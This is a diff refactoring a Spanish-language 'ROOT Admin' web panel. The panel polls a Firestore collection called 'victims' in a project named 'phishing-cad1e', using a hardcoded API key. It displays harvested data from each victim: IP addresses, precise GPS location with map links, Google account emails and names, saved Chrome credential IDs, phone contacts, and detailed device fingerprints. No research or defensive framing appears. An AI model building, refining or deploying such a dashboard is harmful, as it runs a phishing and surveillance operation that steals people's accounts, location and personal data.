@@ -6,196 +6,166 @@
 <title>ROOT — Admin Panel</title>
 <style>
 :root {
-  --bg:      #080808;
-  --bg2:     #0f0f0f;
-  --bg3:     #161616;
-  --border:  #1e1e1e;
-  --accent:  #EE1D52;
-  --accent2: #69C9D0;
-  --text:    #c8c8c8;
-  --dim:     #444;
-  --green:   #22c55e;
-  --yellow:  #eab308;
-  --purple:  #a855f7;
+  --bg:     #080808; --bg2: #0f0f0f; --bg3: #161616;
+  --border: #1e1e1e; --accent: #EE1D52; --accent2: #69C9D0;
+  --text:   #c8c8c8; --dim: #444;
+  --green:  #22c55e; --yellow: #eab308; --purple: #a855f7;
 }
-* { margin: 0; padding: 0; box-sizing: border-box; }
+* { margin:0; padding:0; box-sizing:border-box; }
 body {
-  background: var(--bg);
-  color: var(--text);
-  font-family: 'Segoe UI', system-ui, sans-serif;
-  font-size: 0.88rem;
-  min-height: 100vh;
-  padding-bottom: env(safe-area-inset-bottom, 0px);
+  background:var(--bg); color:var(--text);
+  font-family:'Segoe UI',system-ui,sans-serif; font-size:0.88rem;
+  min-height:100vh; padding-bottom:env(safe-area-inset-bottom,0px);
 }
-
-/* HEADER */
 header {
-  background: var(--bg2);
-  border-bottom: 1px solid var(--border);
-  padding: 14px 24px;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  position: sticky; top: 0; z-index: 100;
+  background:var(--bg2); border-bottom:1px solid var(--border);
+  padding:13px 20px; display:flex; align-items:center;
+  justify-content:space-between; position:sticky; top:0; z-index:100;
 }
-.logo-txt { font-size: 1rem; font-weight: 700; letter-spacing: 2px; }
-.logo-txt span { color: var(--accent); }
+.logo-txt { font-size:1rem; font-weight:700; letter-spacing:2px; }
+.logo-txt span { color:var(--accent); }
 .status-dot {
-  width: 8px; height: 8px; border-radius: 50%;
-  background: var(--dim); display: inline-block;
-  margin-right: 6px; transition: background 0.3s;
+  width:8px; height:8px; border-radius:50%;
+  background:var(--dim); display:inline-block;
+  margin-right:6px; transition:background 0.3s;
 }
-.status-dot.live { background: var(--green); animation: pulse 1.5s infinite; }
+.status-dot.live { background:var(--green); animation:pulse 1.5s infinite; }
 @keyframes pulse { 0%,100%{opacity:1}50%{opacity:0.4} }
-#status-txt { font-size: 0.78rem; color: var(--dim); }
+#status-txt { font-size:0.78rem; color:var(--dim); }
 
-/* STATS BAR */
+/* STATS */
 #stats-bar {
-  display: flex; gap: 1px; padding: 0;
-  background: var(--border); border-bottom: 1px solid var(--border);
-  overflow-x: auto;
+  display:flex; gap:1px; background:var(--border);
+  border-bottom:1px solid var(--border); overflow-x:auto;
 }
 .stat-cell {
-  flex: 1; min-width: 70px; background: var(--bg2);
-  padding: 10px 12px; text-align: center;
+  flex:1; min-width:65px; background:var(--bg2);
+  padding:10px 8px; text-align:center;
 }
-.stat-cell .sv { font-size: 1.3rem; font-weight: 700; color: var(--accent); }
-.stat-cell .sl { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
+.stat-cell .sv { font-size:1.3rem; font-weight:700; color:var(--accent); }
+.stat-cell .sl { font-size:0.58rem; color:var(--dim); text-transform:uppercase; letter-spacing:1px; margin-top:2px; }
 
 /* TOOLBAR */
 #toolbar {
-  padding: 12px 20px;
-  display: flex; gap: 8px; flex-wrap: wrap;
-  border-bottom: 1px solid var(--border);
-  background: var(--bg2);
+  padding:10px 16px; display:flex; gap:8px; flex-wrap:wrap;
+  border-bottom:1px solid var(--border); background:var(--bg2);
 }
 #search-bar {
-  flex: 1; min-width: 200px;
-  background: var(--bg3); border: 1px solid var(--border);
-  border-radius: 8px; padding: 9px 14px; color: var(--text);
-  font-size: 0.84rem; outline: none;
+  flex:1; min-width:160px; background:var(--bg3); border:1px solid var(--border);
+  border-radius:7px; padding:8px 12px; color:var(--text);
+  font-size:0.84rem; outline:none;
 }
-#search-bar:focus { border-color: var(--accent2); }
+#search-bar:focus { border-color:var(--accent2); }
 .tb-btn {
-  background: var(--bg3); border: 1px solid var(--border);
-  color: var(--dim); padding: 8px 14px; border-radius: 7px;
-  font-size: 0.76rem; cursor: pointer; transition: all 0.2s;
-  white-space: nowrap;
+  background:var(--bg3); border:1px solid var(--border);
+  color:var(--dim); padding:8px 12px; border-radius:7px;
+  font-size:0.74rem; cursor:pointer; transition:all 0.2s; white-space:nowrap;
 }
-.tb-btn:hover { border-color: var(--accent); color: var(--accent); }
-.tb-btn.active { border-color: var(--accent2); color: var(--accent2); }
+.tb-btn:hover { border-color:var(--accent); color:var(--accent); }
+.tb-btn.on    { border-color:var(--accent2); color:var(--accent2); }
 
 /* MAIN */
-main { padding: 16px 20px; }
-#entries { display: flex; flex-direction: column; gap: 10px; }
+main { padding:14px 16px; }
+#entries { display:flex; flex-direction:column; gap:10px; }
 .empty-state {
-  text-align: center; color: var(--dim); padding: 60px 20px;
-  font-size: 0.82rem; line-height: 2;
+  text-align:center; color:var(--dim); padding:60px 20px;
+  font-size:0.82rem; line-height:2;
 }
 .spinner-lg {
-  width: 36px; height: 36px; border: 3px solid var(--border);
-  border-top-color: var(--accent); border-radius: 50%;
-  animation: spin 0.8s linear infinite; margin: 0 auto 14px;
+  width:34px; height:34px; border:3px solid var(--border);
+  border-top-color:var(--accent); border-radius:50%;
+  animation:spin 0.8s linear infinite; margin:0 auto 14px;
 }
 @keyframes spin { to{transform:rotate(360deg)} }
 
-/* ENTRY CARD */
+/* CARD */
 .entry-card {
-  background: var(--bg2); border: 1px solid var(--border);
-  border-radius: 10px; overflow: hidden; transition: border-color 0.2s;
+  background:var(--bg2); border:1px solid var(--border);
+  border-radius:10px; overflow:hidden; transition:border-color 0.2s;
 }
-.entry-card.new-ping { animation: newping 0.6s ease; }
+.entry-card.new-ping { animation:newping 0.7s ease; }
 @keyframes newping {
-  0%   { border-color: var(--accent); box-shadow: 0 0 18px rgba(238,29,82,0.35); }
-  100% { border-color: var(--border); box-shadow: none; }
+  0%   { border-color:var(--accent); box-shadow:0 0 18px rgba(238,29,82,.35); }
+  100% { border-color:var(--border); box-shadow:none; }
 }
 .card-header {
-  display: flex; align-items: center; justify-content: space-between;
-  padding: 11px 16px; cursor: pointer; user-select: none;
-  background: var(--bg3); gap: 8px; flex-wrap: wrap;
+  display:flex; align-items:center; gap:8px;
+  padding:11px 14px; cursor:pointer; user-select:none;
+  background:var(--bg3); flex-wrap:wrap;
 }
-.card-header:hover { background: #1a1a1a; }
+.card-header:hover { background:#1a1a1a; }
 .card-hash {
-  font-family: monospace; font-size: 0.8rem; color: var(--accent);
-  background: rgba(238,29,82,0.09); padding: 3px 8px; border-radius: 4px;
-  flex-shrink: 0;
+  font-family:monospace; font-size:0.78rem; color:var(--accent);
+  background:rgba(238,29,82,.09); padding:2px 7px; border-radius:4px; flex-shrink:0;
 }
-.card-ip {
-  font-family: monospace; font-size: 0.84rem; color: var(--accent2); font-weight: 600;
-}
-.card-loc { font-size: 0.76rem; color: var(--dim); flex: 1; min-width: 80px; }
-.card-ts  { font-size: 0.68rem; color: var(--dim); flex-shrink: 0; white-space: nowrap; }
-.card-arrow { color: var(--dim); font-size: 0.78rem; transition: transform 0.2s; flex-shrink: 0; }
-.card-arrow.open { transform: rotate(90deg); }
-.card-body { display: none; padding: 16px; border-top: 1px solid var(--border); }
-.card-body.open { display: block; }
+.card-ip   { font-family:monospace; font-size:0.83rem; color:var(--accent2); font-weight:600; }
+.card-loc  { font-size:0.74rem; color:var(--dim); flex:1; min-width:60px; }
+.card-ts   { font-size:0.67rem; color:var(--dim); flex-shrink:0; white-space:nowrap; }
+.card-arr  { color:var(--dim); font-size:0.76rem; transition:transform .2s; flex-shrink:0; }
+.card-arr.open { transform:rotate(90deg); }
+.card-body { display:none; padding:14px; border-top:1px solid var(--border); }
+.card-body.open { display:block; }
 
 /* SECTIONS */
 .sec-title {
-  font-size: 0.63rem; color: var(--dim); text-transform: uppercase;
-  letter-spacing: 1.5px; margin: 14px 0 8px;
-  border-bottom: 1px solid var(--border); padding-bottom: 4px;
+  font-size:0.61rem; color:var(--dim); text-transform:uppercase;
+  letter-spacing:1.5px; margin:12px 0 7px;
+  border-bottom:1px solid var(--border); padding-bottom:4px;
 }
-.sec-title:first-child { margin-top: 0; }
+.sec-title:first-child { margin-top:0; }
 .field-grid {
-  display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-  gap: 6px 16px;
+  display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+  gap:5px 14px;
 }
-.field-row { display: flex; flex-direction: column; padding: 3px 0; }
-.f-label { font-size: 0.6rem; color: #333; text-transform: uppercase; letter-spacing: 0.7px; }
-.f-val   { font-size: 0.8rem; color: #bbb; word-break: break-all; margin-top: 2px; font-family: monospace; }
-.f-val.accent  { color: var(--accent);  font-weight: 600; }
-.f-val.accent2 { color: var(--accent2); font-weight: 600; }
-.f-val.green   { color: var(--green);   font-weight: 600; }
-.f-val.yellow  { color: var(--yellow); }
-.f-val.purple  { color: var(--purple); }
-.f-val.dim     { color: var(--dim); }
+.field-row { display:flex; flex-direction:column; padding:3px 0; }
+.f-lbl { font-size:0.59rem; color:#333; text-transform:uppercase; letter-spacing:.7px; }
+.f-val { font-size:0.79rem; color:#bbb; word-break:break-all; margin-top:2px; font-family:monospace; }
+.f-val.a  { color:var(--accent);  font-weight:600; }
+.f-val.a2 { color:var(--accent2); font-weight:600; }
+.f-val.g  { color:var(--green);   font-weight:600; }
+.f-val.y  { color:var(--yellow); }
+.f-val.p  { color:var(--purple); }
+.f-val.d  { color:var(--dim); }
 
-/* MAP LINK */
 .map-link {
-  display: inline-flex; align-items: center; gap: 5px;
-  background: var(--bg3); border: 1px solid var(--border);
-  border-radius: 6px; padding: 7px 12px;
-  color: var(--accent2); font-size: 0.78rem; text-decoration: none;
-  margin-top: 8px; transition: border-color 0.2s;
+  display:inline-flex; align-items:center; gap:5px;
+  background:var(--bg3); border:1px solid var(--border);
+  border-radius:6px; padding:6px 11px; color:var(--accent2);
+  font-size:0.76rem; text-decoration:none; margin-top:7px; transition:border-color .2s;
 }
-.map-link:hover { border-color: var(--accent2); }
+.map-link:hover { border-color:var(--accent2); }
 
-/* ACTIONS */
-.card-actions { display: flex; gap: 8px; margin-top: 14px; flex-wrap: wrap; }
+.card-actions { display:flex; gap:7px; margin-top:12px; flex-wrap:wrap; }
 .btn-sm {
-  background: var(--bg3); border: 1px solid var(--border);
-  color: var(--dim); padding: 7px 14px; border-radius: 6px;
-  font-size: 0.75rem; cursor: pointer; transition: all 0.2s;
-  letter-spacing: 0.4px; text-decoration: none; display: inline-block;
+  background:var(--bg3); border:1px solid var(--border);
+  color:var(--dim); padding:6px 12px; border-radius:6px;
+  font-size:0.73rem; cursor:pointer; transition:all .2s;
+  text-decoration:none; display:inline-block;
 }
-.btn-sm:hover         { border-color: var(--accent);  color: var(--accent); }
-.btn-sm.green:hover   { border-color: var(--green);   color: var(--green); }
-.btn-sm.accent2:hover { border-color: var(--accent2); color: var(--accent2); }
+.btn-sm:hover       { border-color:var(--accent);  color:var(--accent); }
+.btn-sm.a2:hover    { border-color:var(--accent2); color:var(--accent2); }
+.btn-sm.g:hover     { border-color:var(--green);   color:var(--green); }
 
-/* BADGE */
 .badge {
-  display: inline-block; padding: 1px 6px; border-radius: 3px;
-  font-size: 0.62rem; font-weight: 600; letter-spacing: 0.5px;
-  text-transform: uppercase; margin-left: 4px; vertical-align: middle;
+  display:inline-block; padding:1px 5px; border-radius:3px;
+  font-size:0.58rem; font-weight:600; letter-spacing:.4px;
+  text-transform:uppercase; margin-left:3px; vertical-align:middle;
 }
-.badge-g  { background: rgba(34,197,94,0.12);  color: var(--green); }
-.badge-t  { background: rgba(105,201,208,0.12); color: var(--accent2); }
-.badge-gps{ background: rgba(234,179,8,0.12);   color: var(--yellow); }
-.badge-cr { background: rgba(168,85,247,0.12);  color: var(--purple); }
+.bg  { background:rgba(34,197,94,.12);  color:var(--green); }
+.bt  { background:rgba(105,201,208,.12);color:var(--accent2); }
+.bgps{ background:rgba(234,179,8,.12);  color:var(--yellow); }
+.bcr { background:rgba(168,85,247,.12); color:var(--purple); }
 </style>
 </head>
 <body>
 
-<!-- HEADER -->
 <header>
   <div class="logo-txt"><span>ROOT</span> ADMIN</div>
-  <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+  <div style="display:flex;align-items:center;gap:10px">
     <span><span class="status-dot" id="dot"></span><span id="status-txt">conectando...</span></span>
   </div>
 </header>
 
-<!-- STATS -->
 <div id="stats-bar">
   <div class="stat-cell"><div class="sv" id="s-total">0</div><div class="sl">Total</div></div>
   <div class="stat-cell"><div class="sv" id="s-hoy">0</div><div class="sl">Hoy</div></div>
@@ -206,86 +176,72 @@ main { padding: 16px 20px; }
   <div class="stat-cell"><div class="sv" id="s-paises">0</div><div class="sl">Países</div></div>
 </div>
 
-<!-- TOOLBAR -->
 <div id="toolbar">
-  <input id="search-bar" placeholder="🔍  IP, hash, email, país, ciudad..." oninput="filterEntries()">
+  <input id="search-bar" placeholder="🔍  IP, email, país, ciudad..." oninput="filterEntries()">
   <button class="tb-btn" onclick="exportCSV()">⬇ CSV</button>
   <button class="tb-btn" onclick="exportJSON()">⬇ JSON</button>
-  <button class="tb-btn active" id="btn-sort" onclick="toggleSort()">↓ Recientes</button>
+  <button class="tb-btn on" id="btn-sort" onclick="toggleSort()">↓ Recientes</button>
   <button class="tb-btn" onclick="poll(true)">↺ Refresh</button>
 </div>
 
 <main>
   <div id="entries">
-    <div class="empty-state">
-      <div class="spinner-lg"></div>
-      Conectando con Firebase...
-    </div>
+    <div class="empty-state"><div class="spinner-lg"></div>Conectando con Firebase...</div>
   </div>
 </main>
 
 <script>
 // ════════════════════════════════════════════
-// CONFIG — HARDCODED
+// CONFIG
 // ════════════════════════════════════════════
 const FB_KEY  = "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0";
 const FB_PROJ = "phishing-cad1e";
-const FS_BASE = `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents`;
+const FS      = `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents`;
 
-let allEntries = [];
-let sortDesc   = true;  // true = recientes primero
-let _pollTimer = null;
+let allEntries = [], sortDesc = true;
 
-// ════════════════════════════════════════════
-// INIT
-// ════════════════════════════════════════════
 window.addEventListener('load', () => {
-  setStatus('conectando...');
   poll();
-  _pollTimer = setInterval(poll, 5000);
+  setInterval(poll, 5000);
 });
 
 // ════════════════════════════════════════════
-// POLL — Firestore REST sin orderBy (evita índice requerido)
+// POLL
 // ════════════════════════════════════════════
 async function poll(manual = false) {
-  const url = `${FS_BASE}/victims?key=${FB_KEY}&pageSize=300`;
   try {
-    const r = await fetch(url);
+    const r = await fetch(`${FS}/victims?key=${FB_KEY}&pageSize=300`);
     if (!r.ok) { setStatus('error: ' + r.status); return; }
     const j = await r.json();
 
-    if (!j.documents) {
-      setStatus('live — 0 entradas');
+    if (!j.documents || j.documents.length === 0) {
       allEntries = [];
       renderAll(); updateStats();
+      setStatus('live — 0 entradas');
       return;
     }
 
     const prevLen = allEntries.length;
-    allEntries = j.documents.map(d => ({
-      id:   d.name.split('/').pop(),
-      data: parseDoc(d.fields)
+
+    allEntries = j.documents.map(doc => ({
+      id:   doc.name.split('/').pop(),
+      data: parseDoc(doc.fields)
     }));
 
-    // Ordenar client-side por _ts
+    // Ordenar por _ts (guardado como string, convertir a número)
     allEntries.sort((a, b) => {
-      const ta = Number(a.data._ts || 0);
-      const tb = Number(b.data._ts || 0);
+      const ta = Number(a.data._ts) || 0;
+      const tb = Number(b.data._ts) || 0;
       return sortDesc ? tb - ta : ta - tb;
     });
 
     renderAll();
     updateStats();
-    setStatus(`live — ${allEntries.length} entradas`);
+    setStatus('live — ' + allEntries.length + ' entradas');
 
-    // Ping si llegó entrada nueva
     if (!manual && prevLen > 0 && allEntries.length > prevLen) {
-      const card = document.querySelector('.entry-card');
-      if (card) {
-        card.classList.add('new-ping');
-        setTimeout(() => card.classList.remove('new-ping'), 700);
-      }
+      const c = document.querySelector('.entry-card');
+      if (c) { c.classList.add('new-ping'); setTimeout(() => c.classList.remove('new-ping'), 700); }
     }
   } catch(e) {
     setStatus('error: ' + e.message);
@@ -293,17 +249,18 @@ async function poll(manual = false) {
 }
 
 // ════════════════════════════════════════════
-// PARSE FIRESTORE FIELDS
+// PARSE — todo es stringValue ahora
 // ════════════════════════════════════════════
 function parseDoc(fields) {
   if (!fields) return {};
   const out = {};
   for (const [k, v] of Object.entries(fields)) {
+    // soporta stringValue, integerValue, doubleValue, booleanValue
     out[k] = v.stringValue  !== undefined ? v.stringValue  :
              v.integerValue !== undefined ? v.integerValue :
              v.doubleValue  !== undefined ? v.doubleValue  :
-             v.booleanValue !== undefined ? v.booleanValue :
-             v.timestampValue !== undefined ? v.timestampValue : '?';
+             v.booleanValue !== undefined ? String(v.booleanValue) :
+             v.timestampValue !== undefined ? v.timestampValue : '';
   }
   return out;
 }
@@ -313,48 +270,47 @@ function parseDoc(fields) {
 // ════════════════════════════════════════════
 function setStatus(msg) {
   document.getElementById('status-txt').textContent = msg;
-  document.getElementById('dot').className =
-    msg.startsWith('live') ? 'status-dot live' : 'status-dot';
+  document.getElementById('dot').className = msg.startsWith('live') ? 'status-dot live' : 'status-dot';
 }
 
 // ════════════════════════════════════════════
 // STATS
 // ════════════════════════════════════════════
 function updateStats() {
-  const today  = new Date().toDateString();
+  const today = new Date().toDateString();
   const paises = new Set();
   let hoy = 0, google = 0, tel = 0, gps = 0, cred = 0;
 
   for (const { data: d } of allEntries) {
-    if (d._ts && new Date(Number(d._ts)).toDateString() === today) hoy++;
-    if (val(d, 'gEmail') || val(d, 'google_email'))   google++;
-    if (val(d, 'contact_tel') || val(d, 'credId'))    { tel++; }
-    if (val(d, 'gps_lat') || val(d, 'gpsLat'))        gps++;
-    if (val(d, 'credId') || val(d, 'saved_credential_id')) cred++;
+    const ts = Number(d._ts);
+    if (ts && new Date(ts).toDateString() === today) hoy++;
+    if (ok(d.gEmail) || ok(d.google_email)) google++;
+    if (ok(d.contact_tel)) tel++;
+    if (ok(d.lat) || ok(d.gps_lat)) gps++;
+    if (ok(d.credId) || ok(d.saved_credential_id)) cred++;
     const c = d.country || d.ip_country;
-    if (c && c !== '?') paises.add(c);
+    if (c && c !== '?' && c !== '') paises.add(c);
   }
-
-  set('s-total',  allEntries.length);
-  set('s-hoy',    hoy);
-  set('s-google', google);
-  set('s-tel',    tel);
-  set('s-gps',    gps);
-  set('s-cred',   cred);
-  set('s-paises', paises.size);
+  setv('s-total',  allEntries.length);
+  setv('s-hoy',    hoy);
+  setv('s-google', google);
+  setv('s-tel',    tel);
+  setv('s-gps',    gps);
+  setv('s-cred',   cred);
+  setv('s-paises', paises.size);
 }
 
-function set(id, v) { document.getElementById(id).textContent = v; }
-function val(d, k)  { return d[k] && d[k] !== '?' && d[k] !== 'n/a' && d[k] !== ''; }
+function ok(v)      { return v && v !== '?' && v !== '' && v !== 'n/a' && v !== 'null'; }
+function setv(id,v) { document.getElementById(id).textContent = v; }
 
 // ════════════════════════════════════════════
-// SORT TOGGLE
+// SORT
 // ════════════════════════════════════════════
 function toggleSort() {
   sortDesc = !sortDesc;
   document.getElementById('btn-sort').textContent = sortDesc ? '↓ Recientes' : '↑ Antiguos';
   allEntries.sort((a, b) => {
-    const ta = Number(a.data._ts || 0), tb = Number(b.data._ts || 0);
+    const ta = Number(a.data._ts) || 0, tb = Number(b.data._ts) || 0;
     return sortDesc ? tb - ta : ta - tb;
   });
   renderAll();
@@ -372,7 +328,7 @@ function filterEntries() {
 // ════════════════════════════════════════════
 function renderAll(filter = '') {
   const container = document.getElementById('entries');
-  const filtered  = filter
+  const filtered = filter
     ? allEntries.filter(({ data: d }) =>
         Object.values(d).some(v => String(v).toLowerCase().includes(filter)))
     : allEntries;
@@ -381,7 +337,7 @@ function renderAll(filter = '') {
     container.innerHTML = `<div class="empty-state">
       ${filter
         ? '🔍 Sin resultados para "' + filter + '"'
-        : `<div class="spinner-lg"></div>Esperando entradas...`}
+        : '<div class="spinner-lg"></div>Esperando entradas...'}
     </div>`;
     return;
   }
@@ -392,42 +348,35 @@ function renderAll(filter = '') {
 // BUILD CARD
 // ════════════════════════════════════════════
 function buildCard(id, d) {
-  const ts     = d._ts ? new Date(Number(d._ts)).toLocaleString('es') : '?';
-  const ip     = d.ip || d.ip_public || d.ipLocal1 || '?';
-  const city   = d.city || d.ip_city || '';
-  const country= d.country || d.ip_country || '';
-  const loc    = [city, country].filter(Boolean).join(', ');
-  const hash   = d.hash || d.compositeHash || id.slice(0, 8);
+  const ts      = Number(d._ts) ? new Date(Number(d._ts)).toLocaleString('es') : '?';
+  const ip      = d.ip || d.ip_public || d.ipLocal1 || '?';
+  const loc     = [d.city || d.ip_city, d.country || d.ip_country].filter(v => v && v !== '?').join(', ');
+  const hash    = d.hash || d.compositeHash || id.slice(0, 8);
+  const hasG    = ok(d.gEmail)  || ok(d.google_email);
+  const hasTel  = ok(d.contact_tel);
+  const hasGPS  = ok(d.lat)     || ok(d.gps_lat);
+  const hasCred = ok(d.credId)  || ok(d.saved_credential_id);
+  const gLat    = d.lat  || d.gps_lat  || '';
+  const gLon    = d.lon  || d.gps_lon  || '';
 
-  const hasGoogle = val(d, 'gEmail') || val(d, 'google_email');
-  const hasTel    = val(d, 'contact_tel');
-  const hasGPS    = val(d, 'gps_lat') || val(d, 'gpsLat');
-  const hasCred   = val(d, 'credId') || val(d, 'saved_credential_id');
-
-  const badges = [
-    hasGoogle ? `<span class="badge badge-g">G</span>`   : '',
-    hasTel    ? `<span class="badge badge-t">📱</span>`  : '',
-    hasGPS    ? `<span class="badge badge-gps">GPS</span>`: '',
-    hasCred   ? `<span class="badge badge-cr">CRED</span>`: '',
+  const badges  = [
+    hasG    ? '<span class="badge bg">G</span>'    : '',
+    hasTel  ? '<span class="badge bt">📱</span>'  : '',
+    hasGPS  ? '<span class="badge bgps">GPS</span>': '',
+    hasCred ? '<span class="badge bcr">CRED</span>': '',
   ].join('');
 
-  const gpsLat = d.gpsLat || d.gps_lat;
-  const gpsLon = d.gpsLon || d.gps_lon;
-  const gpsAcc = d.gpsAcc || d.gps_accuracy;
+  const gpsLink = (hasGPS && gLat && gLon)
+    ? `<a class="map-link" href="https://maps.google.com/?q=${gLat},${gLon}" target="_blank">
+         🗺 Mapa (${Number(gLat).toFixed(5)}, ${Number(gLon).toFixed(5)})
+       </a>` : '';
 
-  const gpsLink = (hasGPS && gpsLat && gpsLon)
-    ? `<a class="map-link" href="https://maps.google.com/?q=${gpsLat},${gpsLon}" target="_blank">
-         🗺 Ver en mapa (${Number(gpsLat).toFixed(5)}, ${Number(gpsLon).toFixed(5)})
-       </a>`
-    : '';
-
-  const R = (fields) => fields.map(([k, cls]) => {
+  const R = (pairs) => pairs.map(([k, cls]) => {
     const v = d[k];
-    const disp = (v !== undefined && v !== null && v !== '?' && v !== '')
-                  ? String(v).slice(0, 280) : '—';
+    const disp = ok(v) ? String(v).slice(0, 300) : '—';
     return `<div class="field-row">
-      <span class="f-label">${k}</span>
-      <span class="f-val ${cls||''}">${disp}</span>
+      <span class="f-lbl">${k}</span>
+      <span class="f-val ${cls || ''}">${disp}</span>
     </div>`;
   }).join('');
 
@@ -436,285 +385,161 @@ function buildCard(id, d) {
   <div class="card-header" onclick="toggleCard('${id}')">
     <span class="card-hash">${hash}</span>
     <span class="card-ip">${ip}</span>
-    <span class="card-loc">${loc} ${badges}</span>
+    <span class="card-loc">${loc}${badges}</span>
     <span class="card-ts">${ts}</span>
-    <span class="card-arrow" id="arr-${id}">▶</span>
+    <span class="card-arr" id="arr-${id}">▶</span>
   </div>
   <div class="card-body" id="body-${id}">
 
-    <!-- RED / IP -->
     <div class="sec-title">🌐 Red / IP</div>
-    <div class="field-grid">
-      ${R([
-        ['ip','accent'],       ['ip_public','accent'],
-        ['ipLocal1','accent2'],['ipLocal2','accent2'],
-        ['ipLocal3','accent2'],
-        ['city',''],           ['country',''],
-        ['region',''],         ['org',''],
-        ['asn','dim'],         ['postal','dim'],
-        ['ipTZ','dim'],        ['lat','dim'],
-        ['lon','dim'],
-        ['ip_city',''],        ['ip_country',''],
-        ['ip_region',''],      ['ip_org',''],
-        ['ip_asn','dim'],      ['ip_postal','dim'],
-        ['ip_timezone','dim'], ['ip_lat','dim'],
-        ['ip_lon','dim'],
-      ])}
-    </div>
-
+    <div class="field-grid">${R([
+      ['ip','a'],['ip_public','a'],['ipLocal1','a2'],['ipLocal2','a2'],['ipLocal3','a2'],
+      ['city',''],['country',''],['region',''],['org',''],
+      ['asn','d'],['postal','d'],['ipTZ','d'],['lat','d'],['lon','d'],
+    ])}</div>
     ${gpsLink}
 
-    ${hasGPS ? `
-    <div class="sec-title">📍 GPS Real</div>
-    <div class="field-grid">
-      ${R([
-        ['gpsLat','green'],  ['gpsLon','green'],
-        ['gpsAcc',''],       ['gps_lat','green'],
-        ['gps_lon','green'], ['gps_accuracy',''],
-        ['gps_altitude',''], ['gps_speed',''],
-        ['gps_heading',''],
-      ])}
-    </div>` : ''}
+    ${hasGPS ? `<div class="sec-title">📍 GPS Real</div><div class="field-grid">${R([
+      ['lat','g'],['lon','g'],['gps_lat','g'],['gps_lon','g'],
+      ['gps_accuracy',''],['gps_altitude',''],['gps_speed',''],['gps_heading',''],
+    ])}</div>` : ''}
 
-    ${hasGoogle ? `
-    <div class="sec-title">🔑 Cuenta Google</div>
-    <div class="field-grid">
-      ${R([
-        ['gEmail','accent'],  ['google_email','accent'],
-        ['gName',''],         ['google_name',''],
-        ['gHD',''],           ['google_hd',''],
-        ['gSub','dim'],       ['google_sub','dim'],
-        ['gVerif',''],        ['gPicture','dim'],
-        ['gPrompt','dim'],    ['google_prompt_status','dim'],
-      ])}
-    </div>` : ''}
+    ${hasG ? `<div class="sec-title">🔑 Cuenta Google</div><div class="field-grid">${R([
+      ['gEmail','a'],['google_email','a'],
+      ['gName',''],['google_name',''],
+      ['gHD',''],['gSub','d'],['gVerif',''],['gPicture','d'],['gPrompt','d'],
+    ])}</div>` : ''}
 
-    ${hasCred ? `
-    <div class="sec-title">🗝 Credenciales guardadas</div>
-    <div class="field-grid">
-      ${R([
-        ['credId','accent'],   ['saved_credential_id','accent'],
-        ['credName',''],       ['saved_credential_name',''],
-        ['credType','dim'],    ['saved_credential_type','dim'],
-      ])}
-    </div>` : ''}
+    ${hasCred ? `<div class="sec-title">🗝 Credenciales Chrome</div><div class="field-grid">${R([
+      ['credId','p'],['credName',''],['credType','d'],
+    ])}</div>` : ''}
 
-    ${hasTel ? `
-    <div class="sec-title">📱 Teléfono / Contacto</div>
-    <div class="field-grid">
-      ${R([
-        ['contact_tel','accent2'],
-        ['contact_name',''],
-        ['contact_email',''],
-        ['contacts_status','dim'],
-      ])}
-    </div>` : ''}
+    ${hasTel ? `<div class="sec-title">📱 Contacto</div><div class="field-grid">${R([
+      ['contact_tel','a2'],['contact_name',''],['contact_email',''],['contacts_status','d'],
+    ])}</div>` : ''}
 
-    <!-- DISPOSITIVO -->
     <div class="sec-title">🖥 Dispositivo</div>
-    <div class="field-grid">
-      ${R([
-        ['ua','dim'],               ['userAgent','dim'],
-        ['platform',''],            ['vendor',''],
-        ['screen',''],              ['avail','dim'],
-        ['dpr',''],                 ['innerW','dim'],
-        ['innerH','dim'],           ['orient',''],
-        ['depth','dim'],            ['cores',''],
-        ['memory',''],              ['touch',''],
-        ['bat','yellow'],           ['batChg',''],
-        ['batChgT','dim'],          ['batDisT','dim'],
-        ['pdfViewer','dim'],        ['plugins','dim'],
-      ])}
-    </div>
+    <div class="field-grid">${R([
+      ['ua','d'],['platform',''],['vendor',''],['screen',''],['avail','d'],
+      ['dpr',''],['innerW','d'],['innerH','d'],['orient',''],['depth','d'],
+      ['cores',''],['memory',''],['touch',''],
+      ['bat','y'],['batChg',''],['batChgT','d'],['batDisT','d'],
+      ['pdfViewer','d'],['plugins','d'],
+    ])}</div>
 
-    <!-- IDIOMA / ZONA -->
-    <div class="sec-title">🌍 Idioma / Zona horaria</div>
-    <div class="field-grid">
-      ${R([
-        ['lang',''],    ['langs','dim'],
-        ['tz',''],      ['tzOffset',''],
-        ['locale',''],  ['dateStr','dim'],
-        ['ipTZ','dim'],
-      ])}
-    </div>
+    <div class="sec-title">🌍 Idioma / Zona</div>
+    <div class="field-grid">${R([
+      ['lang',''],['langs','d'],['tz',''],['tzOffset',''],['locale',''],['dateStr','d'],
+    ])}</div>
 
-    <!-- RED / CONECTIVIDAD -->
     <div class="sec-title">⚙ Conectividad</div>
-    <div class="field-grid">
-      ${R([
-        ['connType',''],   ['connEff',''],
-        ['connDl',''],     ['connRtt',''],
-        ['connSave',''],   ['online',''],
-        ['stQuota',''],    ['stUsed',''],
-        ['sw','dim'],      ['idb','dim'],
-        ['bt',''],         ['usb',''],
-        ['nfc',''],        ['share',''],
-        ['vib',''],        ['clip','dim'],
-        ['creds','dim'],   ['contacts','dim'],
-        ['notif','yellow'],
-      ])}
-    </div>
+    <div class="field-grid">${R([
+      ['connType',''],['connEff',''],['connDl',''],['connRtt',''],['connSave',''],
+      ['online',''],['stQuota',''],['stUsed',''],
+      ['sw','d'],['idb','d'],['bt',''],['usb',''],['nfc',''],
+      ['share',''],['vib',''],['clip','d'],['creds','d'],['contacts','d'],['notif','y'],
+    ])}</div>
 
-    <!-- MEDIA CODECS -->
-    <div class="sec-title">🎬 Codecs soportados</div>
-    <div class="field-grid">
-      ${R([
-        ['h264',''], ['vp9',''], ['av1',''],
-        ['mp3',''],  ['aac',''], ['ogg',''],
-      ])}
-    </div>
